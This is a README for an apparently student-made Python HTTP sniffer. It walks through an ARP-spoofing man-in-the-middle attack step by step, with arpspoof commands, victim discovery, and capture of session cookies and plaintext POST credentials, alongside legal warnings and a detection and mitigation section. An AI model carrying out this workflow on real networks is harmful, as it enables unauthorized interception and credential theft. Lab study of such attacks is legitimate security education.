# 🔍 HTTP Sniffer MITM - Educational Network Analysis Tool

<div align="center">

[![Python Version](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Kali-red.svg)]()
[![License](https://img.shields.io/badge/license-Educational%20Use%20Only-green.svg)](LICENSE)
[![Scapy](https://img.shields.io/badge/powered%20by-Scapy-orange.svg)](https://scapy.net/)
[![Status](https://img.shields.io/badge/status-active-success.svg)]()

**Man-in-the-Middle HTTP Traffic Analyzer for Security Research**

[Features](#-features) •
[Installation](#-installation) •
[Usage](#-usage) •
[Lab Setup](#-lab-setup) •
[Legal](#️-legal-disclaimer)

</div>

---

## ⚠️ LEGAL DISCLAIMER

> **FOR AUTHORIZED PENETRATION TESTING AND EDUCATIONAL PURPOSES ONLY**
> 
> This tool is designed for **authorized security testing** in controlled laboratory environments.
> 
> - ❌ **NEVER** use on networks without explicit written authorization
> - ❌ Unauthorized interception of network traffic is **ILLEGAL** (wiretapping laws)
> - ✅ Use only in isolated lab environments (VMs, test networks)
> - ✅ Obtain proper authorization before any penetration test
> 
> **Violating these terms may result in:**
> - Criminal prosecution (Wiretap Act, Computer Fraud and Abuse Act)
> - Civil liability and damages
> - Academic expulsion
> - Loss of professional certifications

**FRANÇAIS:**
Cet outil est conçu **uniquement pour des tests de sécurité autorisés** en environnement de laboratoire contrôlé. L'interception non autorisée du trafic réseau est **ILLÉGALE**. Utilisez uniquement dans des environnements isolés avec autorisation explicite.

---

## 📋 Table of Contents

- [Features](#features)
- [How It Works](#how-it-works)
- [Requirements](#requirements)
- [Installation](#installation)
- [Usage](#usage)
- [Output Examples](#output-examples)
- [Lab Setup](#lab-setup)
- [Troubleshooting](#troubleshooting)
- [Detection & Mitigation](#detection--mitigation)
- [Legal Considerations](#legal-considerations)

---

## 🎯 Features

### Core Functionality
- **HTTP Traffic Interception**: Captures HTTP requests on TCP port 80
- **Request Analysis**: Extracts method, URL, headers, cookies
- **POST Data Capture**: Optional display of POST request payloads
- **Source IP Tracking**: Identifies victim machines making requests

### Advanced Capabilities
- **CSV Export**: Save captured data for reporting and analysis
- **Colorized Output**: Easy-to-read terminal display with color coding
- **User-Agent Detection**: Identify browsers and applications
- **Cookie Extraction**: Capture session cookies and tokens
- **Debug Mode**: Detailed logging for troubleshooting
- **Interface Selection**: Specify network interface for sniffing

### Reporting Features
- Timestamp tracking for all requests
- CSV format for easy import into reports
- Real-time terminal display
- Password/credential detection in POST data

---

## 🔬 How It Works

```
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│   Victim    │         │   Attacker   │         │   Web       │
│  (Target)   │◄───ARP──┤   (MITM)     │────────►│   Server    │
└─────────────┘  Spoof  └──────────────┘  Forward └─────────────┘
       │                        │                         │
       │  HTTP Request          │                         │
       │  GET /login.php ──────►│                         │
       │                    [INTERCEPT]                   │
       │                    [LOG REQUEST]                 │
       │                    [EXTRACT DATA]                │
       │                        │                         │
       │                        │──── Forward Request ───►│
       │                        │                         │
       │                        │◄──── HTTP Response ─────│
       │◄─── Forward Response ──│                         │
```

### Attack Workflow:

1. **ARP Spoofing**: Position attacker between victim and gateway
2. **IP Forwarding**: Enable packet forwarding on attacker machine
3. **Packet Sniffing**: Capture HTTP traffic (port 80)
4. **Data Extraction**: Parse HTTP headers, cookies, POST data
5. **Logging**: Display and/or save to CSV file
6. **Forward Traffic**: Maintain connection transparency

---

## 📦 Requirements

### Operating System
- **Primary**: Kali Linux 2023.x+
- **Alternative**: Parrot OS, Ubuntu 20.04+ with security tools

### Python Version
- Python 3.8 or higher

### System Dependencies

```bash
# Required packages
python3
python3-pip
tcpdump (optional, for verification)
```

### Python Dependencies

```python
scapy>=2.5.0
colorama>=0.4.6
```

### Network Requirements
- Attacker machine on same network segment as victim
- Ability to perform ARP spoofing
- Root/sudo privileges on attacker machine

---

## 🔧 Installation

### Step 1: System Update

```bash
sudo apt update && sudo apt upgrade -y
```

### Step 2: Install Python Dependencies

```bash
# Install pip if not present
sudo apt install -y python3-pip

# Install required Python packages
pip3 install scapy colorama

# Or use requirements.txt
pip3 install -r requirements.txt
```

### Step 3: Download the Tool

```bash
# Clone repository
git clone https://github.com/melissachall/HTTP-Sniffer-MITM.git
cd HTTP-Sniffer-MITM

# Make script executable
chmod +x http_sniffer.py
```

### Step 4: Install ARP Spoofing Tools

```bash
# Install dsniff (for arpspoof)
sudo apt install -y dsniff

# Or install ettercap as alternative
sudo apt install -y ettercap-text-only
```

### Step 5: Enable IP Forwarding

```bash
# Temporary (until reboot)
sudo sysctl -w net.ipv4.ip_forward=1

# Permanent
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

### Step 6: Verify Installation

```bash
# Test imports
python3 -c "from scapy.all import *; print('Scapy OK')"
python3 -c "from colorama import init; print('Colorama OK')"

# Test script
sudo python3 http_sniffer.py --help
```

---

## 🚀 Usage

### Basic Usage

```bash
# Basic sniffing (default interface)
sudo python3 http_sniffer.py
```

### Command-Line Arguments

| Argument | Description | Example |
|----------|-------------|---------|
| `-i`, `--iface` | Network interface to sniff on | `-i eth0` |
| `--debug` | Enable debug logging | `--debug` |
| `--show-raw` | Display raw POST data | `--show-raw` |
| `--csv FILE` | Save results to CSV file | `--csv log.csv` |

### Usage Examples

#### 1. Basic Sniffing on Specific Interface

```bash
sudo python3 http_sniffer.py -i eth0
```

#### 2. Capture with POST Data Display

```bash
sudo python3 http_sniffer.py -i eth0 --show-raw
```

#### 3. Full Capture with CSV Export

```bash
sudo python3 http_sniffer.py -i eth0 --show-raw --csv http_capture.csv --debug
```

#### 4. Minimal Output (No Raw Data)

```bash
sudo python3 http_sniffer.py -i wlan0 --csv results.csv
```

---

## 🎯 Complete Attack Workflow

### Step 1: Prepare Attacker Machine

```bash
# 1. Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# 2. Identify network interface
ip addr show
# Note your interface name (eth0, ens33, wlan0, etc.)

# 3. Identify victim and gateway IPs
sudo netdiscover -i eth0
# or
sudo arp-scan --localnet
```

### Step 2: Start ARP Spoofing (2 Terminals)

**Terminal 1: Spoof Victim → Gateway**
```bash
sudo arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
```

**Terminal 2: Spoof Gateway → Victim**
```bash
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.20
```

### Step 3: Start HTTP Sniffer (Terminal 3)

```bash
sudo python3 http_sniffer.py -i eth0 --show-raw --csv capture.csv
```

### Step 4: Test from Victim Machine

**On victim, visit HTTP websites:**
```
http://testphp.vulnweb.com
http://neverssl.com
http://example.com
```

**Try login forms (test sites only!):**
```
http://testphp.vulnweb.com/login.php
Username: test
Password: test
```

### Step 5: Analyze Captured Data

**Terminal Output:**
```
2025-11-23 13:20:45 [192.168.1.20] GET http://example.com/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Cookies: session_id=abc123xyz789

2025-11-23 13:21:10 [192.168.1.20] POST http://testphp.vulnweb.com/login.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
[*] Raw POST data: username=test&password=test123
```

**CSV File (`capture.csv`):**
```csv
timestamp,ip,method,url,user_agent,cookies,raw_post
2025-11-23 13:20:45,192.168.1.20,GET,http://example.com/,Mozilla/5.0 (Windows NT 10.0; Win64; x64),session_id=abc123,
2025-11-23 13:21:10,192.168.1.20,POST,http://testphp.vulnweb.com/login.php,Mozilla/5.0 (Windows NT 10.0; Win64; x64),,username=test&password=test123
```

### Step 6: Clean Shutdown

```bash
# Press Ctrl+C in all terminals
# ARP spoofing stops automatically
# HTTP sniffer saves final data and exits
```

---

## 📊 Output Examples

### Terminal Output (Colorized)

```
2025-11-23 13:20:45 [192.168.1.20] GET http://example.com/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Cookies: sessionid=abc123; csrftoken=xyz789

2025-11-23 13:21:02 [192.168.1.20] POST http://login.example.com/auth
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
[*] Raw POST data: b'username=admin&password=P@ssw0rd123&submit=Login'

2025-11-23 13:21:15 [192.168.1.20] GET http://api.example.com/data
User-Agent: curl/7.68.0
```

### CSV Export Format

| Timestamp | IP | Method | URL | User Agent | Cookies | Raw POST |
|-----------|----|---------|----|------------|---------|----------|
| 2025-11-23 13:20:45 | 192.168.1.20 | GET | http://example.com/ | Mozilla/5.0... | sessionid=abc123 | |
| 2025-11-23 13:21:02 | 192.168.1.20 | POST | http://login.example.com/auth | Mozilla/5.0... | | username=admin&password=P@ssw0rd123 |

---

## 🧪 Lab Setup

### Recommended Virtual Lab Configuration

```
┌────────────────────────────────────────────────────────────┐
│                    VirtualBox/VMware                       │
│                                                            │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐   │
│  │  Kali Linux  │  │   Windows    │  │   Web Server │   │
│  │  (Attacker)  │  │   (Victim)   │  │  (Optional)  │   │
│  │              │  │              │  │              │   │
│  │ 192.168.1.10 │  │ 192.168.1.20 │  │ 192.168.1.30 │   │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘   │
│         │                 │                 │            │
│         └─────────────────┴─────────────────┘            │
│                   Internal Network                        │
│                   (192.168.1.0/24)                       │
└────────────────────────────────────────────────────────────┘
```

### Test Websites (Legal to Test)

**Safe HTTP Sites for Testing:**
1. **http://neverssl.com** - Intentionally non-HTTPS site
2. **http://testphp.vulnweb.com** - Acunetix test site with vulnerabilities
3. **http://httpforever.com** - HTTP-only test site
4. **http://example.com** - Basic example site

**⚠️ NEVER test on:**
- Real user accounts
- Production websites
- Banking or financial sites
- Any site without authorization

---

## 🐛 Troubleshooting

### Issue 1: "Permission Denied"

```bash
PermissionError: [Errno 1] Operation not permitted
```

**Solution:**
```bash
# Always run with sudo for packet capture
sudo python3 http_sniffer.py
```

### Issue 2: "No Module Named 'scapy'"

```bash
ModuleNotFoundError: No module named 'scapy'
```

**Solution:**
```bash
pip3 install scapy
# Or system-wide:
sudo apt install python3-scapy
```

### Issue 3: "No HTTP Traffic Captured"

**Check ARP Spoofing:**
```bash
# On victim, check ARP table
arp -a  # Windows
arp -n  # Linux

# Gateway MAC should match attacker's MAC
```

**Check IP Forwarding:**
```bash
cat /proc/sys/net/ipv4/ip_forward
# Should output: 1
```

**Verify Traffic Flow:**
```bash
# On attacker, capture all traffic
sudo tcpdump -i eth0 -n
# Should see victim's traffic passing through
```

### Issue 4: "Interface Not Found"

```bash
# List available interfaces
ip addr show
# or
ifconfig

# Use correct interface name
sudo python3 http_sniffer.py -i eth0  # or ens33, wlan0, etc.
```

### Issue 5: "CSV File Not Created"

**Check Permissions:**
```bash
# Ensure write permission in current directory
ls -la

# Or specify full path
sudo python3 http_sniffer.py --csv /tmp/capture.csv
```

### Issue 6: "Only HTTPS Traffic (No HTTP)"

**Problem:** Modern websites use HTTPS by default

**Solution:**
- Use test sites that support HTTP (see Lab Setup section)
- For HTTPS, consider using `mitmproxy` or `sslstrip` (advanced)
- Note: This tool only captures unencrypted HTTP traffic

---

## 🛡️ Detection & Mitigation

### How to Detect This Attack

#### 1. ARP Spoofing Detection

```bash
# Check for duplicate MAC addresses
arp -a

# Use ARP monitoring tools
sudo arpwatch -i eth0

# Look for gateway MAC mismatches
```

#### 2. Network Traffic Analysis

```bash
# Monitor for promiscuous mode interfaces
ip link show
# Look for "PROMISC" flag

# Use Wireshark to detect ARP anomalies
# Filter: arp.duplicate-address-detected
```

#### 3. SSL/TLS Enforcement

```bash
# Modern browsers show warnings for:
# - HTTP sites with forms
# - Mixed content (HTTPS page with HTTP resources)
# - Certificate errors
```

### Mitigation Techniques

#### For Organizations:

1. **Enforce HTTPS Everywhere**
   - Use HSTS (HTTP Strict Transport Security)
   - Redirect all HTTP to HTTPS
   - Use certificate pinning

2. **Network Security**
   - Static ARP entries for critical systems
   - 802.1X port authentication
   - Network segmentation (VLANs)
   - IDS/IPS deployment (Snort, Suricata)

3. **Monitoring**
   - ARP traffic monitoring
   - Detect promiscuous mode NICs
   - Log analysis for anomalies

#### For Individuals:

1. **Use HTTPS Only**
   - Browser extension: "HTTPS Everywhere"
   - Avoid sites without valid SSL certificates
   - Check for padlock icon in browser

2. **VPN Usage**
   - Encrypted tunnel bypasses local MITM
   - Especially important on public Wi-Fi

3. **Browser Security**
   - Enable "Do Not Track"
   - Use privacy-focused browsers (Firefox, Brave)
   - Disable HTTP fallback

4. **Network Awareness**
   - Avoid public/untrusted Wi-Fi for sensitive activities
   - Use mobile data for banking/payments
   - Verify gateway MAC address

---

## ⚖️ Legal Considerations

### When Is This LEGAL?

✅ **Authorized Scenarios:**
- Personal lab environment (all devices owned by you)
- Academic coursework with professor approval
- Authorized penetration testing with signed contract
- Corporate security testing with management authorization
- Bug bounty programs with explicit scope

### When Is This ILLEGAL?

❌ **Prohibited Scenarios:**
- Public Wi-Fi networks (coffee shops, airports, hotels)
- Corporate networks without authorization
- Educational institution networks (without IT approval)
- ISP networks
- Any network where you don't own ALL devices

### Legal Framework

**United States:**
- **Wiretap Act (18 U.S.C. § 2511)**: Prohibits interception of electronic communications
  - Penalty: Up to 5 years imprisonment per violation
- **Computer Fraud and Abuse Act (CFAA)**: Unauthorized access to computer systems
  - Penalty: Up to 10-20 years imprisonment
- **Stored Communications Act**: Protects stored electronic communications
  - Penalty: Fines and imprisonment

**European Union:**
- **GDPR Article 5**: Lawful, fair, and transparent processing
- **ePrivacy Directive (2002/58/EC)**: Confidentiality of communications
- **Cybercrime Directive (2013/40/EU)**: Illegal interception
- Penalties: Up to €20 million or 4% of global revenue

**Canada:**
- **Criminal Code Section 184**: Interception of private communications
  - Penalty: Up to 5 years imprisonment
- **Personal Information Protection and Electronic Documents Act (PIPEDA)**

**United Kingdom:**
- **Computer Misuse Act 1990**: Unauthorized access to computer material
  - Penalty: Up to 10 years imprisonment
- **Regulation of Investigatory Powers Act 2000**: Interception of communications

### Penalties for Misuse

**Criminal:**
- Imprisonment (5-20 years depending on jurisdiction)
- Fines ($250,000+ per violation)
- Criminal record

**Civil:**
- Lawsuits for damages
- Compensation to victims
- Legal fees

**Academic:**
- Expulsion from institution
- Loss of scholarships
- Blacklisting from programs

**Professional:**
- Loss of certifications (CISSP, CEH, etc.)
- Industry blacklisting
- Reputation damage

### Best Practices for Legal Use

1. **Get Written Authorization**
   ```
   Authorization Letter Must Include:
   - Scope of testing (specific network/systems)
   - Authorized testing period
   - Authorized methods
   - Reporting requirements
   - Signatures from authorized parties
   ```

2. **Document Everything**
   - Testing methodology
   - Timestamps of all activities
   - Findings and evidence
   - Communication logs

3. **Use Isolated Environments**
   - Virtual labs only
   - No connection to production
   - Clear network boundaries

4. **Follow Responsible Disclosure**
   - Report vulnerabilities to affected parties
   - Allow time for remediation (90 days standard)
   - Don't publicly disclose until patched

---

## 🎓 Educational Objectives

This project demonstrates:

### 1. Network Protocol Analysis
- Understanding HTTP protocol structure
- Request/response headers
- Cookie mechanisms
- POST data transmission

### 2. Man-in-the-Middle Techniques
- ARP spoofing fundamentals
- Traffic interception
- Packet forwarding
- Session hijacking concepts

### 3. Security Awareness
- Dangers of unencrypted HTTP
- Importance of HTTPS/TLS
- Cookie security
- Password transmission risks

### 4. Defensive Security
- Attack detection methods
- Traffic analysis
- Security monitoring
- Mitigation strategies

### Academic Report Structure

```markdown
1. Introduction
   - Objectives
   - HTTP protocol overview
   - Legal/ethical statement

2. Technical Background
   - HTTP vs HTTPS
   - ARP spoofing mechanics
   - MITM attack vectors
   - Packet sniffing techniques

3. Implementation
   - Tool architecture
   - Scapy packet processing
   - Data extraction methods
   - CSV logging implementation

4. Lab Setup
   - Network topology
   - VM configuration
   - Test scenarios

5. Results & Analysis
   - Sample captures
   - Data extracted
   - Security implications

6. Defense Mechanisms
   - HTTPS enforcement
   - ARP spoofing detection
   - Network monitoring
   - Best practices

7. Conclusion
   - Lessons learned
   - Real-world implications
   - Recommendations

8. References
```

---

## 📚 References

### Technical Documentation
- [Scapy Documentation](https://scapy.readthedocs.io/)
- [RFC 2616 - HTTP/1.1](https://tools.ietf.org/html/rfc2616)
- [RFC 6265 - HTTP State Management (Cookies)](https://tools.ietf.org/html/rfc6265)

### Security Research
- MITRE ATT&CK - Adversary-in-the-Middle (T1557)
- OWASP Top 10 - A02:2021 Cryptographic Failures
- NIST SP 800-52 - Guidelines for TLS Implementations

### Legal Resources
- Electronic Communications Privacy Act (ECPA)
- Wiretap Act (18 U.S.C. § 2511)
- GDPR - Data Protection Regulation
- Computer Fraud and Abuse Act (CFAA)

### Educational Resources
- [Kali Linux Documentation](https://www.kali.org/docs/)
- [Scapy Tutorial](https://scapy.readthedocs.io/en/latest/usage.html)
- [HTTP Protocol Tutorial](https://developer.mozilla.org/en-US/docs/Web/HTTP)

---

## 👨‍🎓 Author

**Melissa Hall** (@melissachall)
- Cybersecurity Student - Network Security
- Educational Project - Penetration Testing Research
- Date: November 2025

---

## 📄 License

This project is released for **educational and authorized penetration testing purposes only**.

- ✅ Study and analysis for learning
- ✅ Authorized security testing with permission
- ❌ Commercial use prohibited
- ❌ Unauthorized traffic interception prohibited

**Users accept full legal responsibility for their actions.**

---

## 🙏 Acknowledgments

- Scapy development team
- Colorama contributors
- Kali Linux project
- Cybersecurity education community
- OWASP Foundation

---

## 🔒 Security Note

**Why HTTP Sniffing Still Matters in 2025:**

While most websites now use HTTPS, HTTP sniffing remains relevant for:

1. **Legacy Systems**: Many IoT devices, printers, cameras use HTTP
2. **Internal Networks**: Corporate intranets often use HTTP
3. **Educational Value**: Understanding protocol weaknesses
4. **Security Testing**: Identifying unencrypted communications
5. **Compliance**: Ensuring HTTPS enforcement

**This tool teaches the importance of encryption by demonstrating its absence.**

---

**⚠️ FINAL WARNING ⚠️**

> Intercepting network communications without authorization is a serious crime. This tool is designed to teach defensive security by understanding offensive techniques. Always use ethically, legally, and responsibly in controlled environments only.

**Remember: "Security through understanding, not through obscurity."**

---

**Last Updated:** 2025-11-23  
**Version:** 1.0  
**Status:** Educational Release
